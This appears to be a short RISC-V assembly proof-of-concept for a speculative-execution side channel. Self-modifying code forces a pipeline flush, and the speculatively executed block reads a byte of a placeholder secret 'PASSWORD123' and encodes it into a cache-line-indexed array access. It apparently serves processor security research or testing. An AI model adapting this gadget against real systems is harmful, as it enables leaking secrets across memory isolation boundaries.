#include "defines.h"

#define MAGIC_NUMBER 0xdeadbeef

.section .text
.global smc_snippet
smc_snippet:
// ; stack management {
    addi    sp,sp,-16
    sd	    s0,8(sp)
// ; }
// ; Load addr of target instr 
    la t0, target
// ;Code to write as data: 1 nop (overwriting lines of target)
    li t1, 0x0001
    li t2, 0

// ;Store at target addr. Also: the last retired instr
// ;from which the execution will resume after the SMC MC
    sh t1, 0(t0)

// ;Target instruction to be modified
target:
    j spec_code
    nop
    nop
    nop

// ;Architectural exit point of the function
    li a0, MAGIC_NUMBER
    j reset_stack
    
// ;Code executed speculatively (flushed after SMC MC).
spec_code:
    la t1, secret  
    add t1, t1, a1
    lb t2, 0(t1)
    sll t2, t2, 6
    add a0, a0, t2
    lb t2, 0(a0)
    addi a0, t2, 0
    
reset_stack:
    addi	s0,sp,16
    ld	    s0,8(sp)
    addi	sp,sp,16
    ret

.section .data
.global control
control:
.byte  0xff
.rept 12
.word  0x5d
.endr
unused_before:
.rept 64
.dword 0xffffffff
.endr
.global secret
secret:     .string "PASSWORD123\0"
unused_after:
.rept 64
.dword 0xffffffff
.endr

